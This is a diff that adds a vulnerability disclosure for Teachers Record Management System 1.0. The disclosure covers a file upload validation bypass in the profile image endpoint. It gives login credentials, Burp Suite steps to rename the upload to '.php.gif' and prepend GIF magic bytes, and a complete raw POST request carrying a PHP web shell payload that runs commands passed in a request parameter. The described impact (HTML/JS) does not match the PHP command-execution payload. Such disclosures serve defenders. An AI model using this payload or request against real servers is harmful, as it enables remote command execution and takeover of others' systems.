@@ -1,0 +1,77 @@
+```
+Exploit Title: Teachers Record Management System 1.0 – File Upload Type Validation Error in /changeimage
+Date: 17-01-2023
+Vendor Homepage: https://phpgurukul.com
+Software Link: https://phpgurukul.com/teachers-record-management-system-using-php-and-mysql/
+Version: 1.0
+Tested on: Windows 11 + XAMPP 
+```
+
+<h2>DESCRIPTION</h2>
+The upload functionality of updating user profile does not properly validate the file content-type, 
+filename, allowing any authenticated user to bypass this security check by adding a valid signature (p.e. GIF89) 
+and sending any invalid content-type. This could allow an authenticated attacker to upload HTML files with JS content 
+that will be executed in the context of the domain.
+
+<h2>STEPS-TO-REPRODUCE</h2>
+
+1. Login into Teacher-Account with the credentials “**Username:** jogoe12@yourdomain.com”
+**Password: Test@123**”
+
+2. Navigate to Profile Section and edit the Profile Pic by clicking on **Edit Image**
+3. Open the Burp-suite and Intercept the  Edit Image Request 
+4. In POST Request Change the “ **Filename** “ from “ **profile picture.png** “  to  “**profile picture.php.gif** ” 
+5. Change the **Content-type from “ image/png “ to “ image/jpg “**
+6. And Add this **Payload** : GIF89a <?php echo system($_REQUEST['dx']); ?> 
+7. Where **GIF89a is the GIF magic bytes this bypass the file upload extension**
+8. Below is the Burpsuite-POST Request for all the changes that I have made above
+
+<h2>PROOF-OF-CONCEPT</h2>
+The following request was modified to allow uploading php file using a valid GIF signature, but can be modified to upload any kind of content-type:
+
+```
+POST /trms/teacher/changeimage.php HTTP/1.1
+Host: localhost
+Content-Length: 442
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryndAPYa0GGOxSUHdF
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost/trms/teacher/changeimage.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=8alf0rbfjmhm3ddra7si0cv7qc
+Connection: close
+
+------WebKitFormBoundaryndAPYa0GGOxSUHdF
+Content-Disposition: form-data; name="subjects"
+
+John Doe
+------WebKitFormBoundaryndAPYa0GGOxSUHdF
+Content-Disposition: form-data; name="newpic"; filename="profile picture.php.gif"
+Content-Type: image/gif
+
+GIF89a <?php echo system($_REQUEST['dx']); ?>
+
+------WebKitFormBoundaryndAPYa0GGOxSUHdF
+Content-Disposition: form-data; name="submit"
+
+
+------WebKitFormBoundaryndAPYa0GGOxSUHdF--
+```
+![Teacher-management-poc-file-upload-1](https://user-images.githubusercontent.com/98345027/212889242-0b6bf2d9-d68e-428d-a2ea-c53418b6fa70.png)
+
+
+<h2>IMPACT</h2>
+This could allow an attacker to write custom pages ,Those pages can contain phishing html 
+or even JS code that will be executed in the context of the active user browser.
+
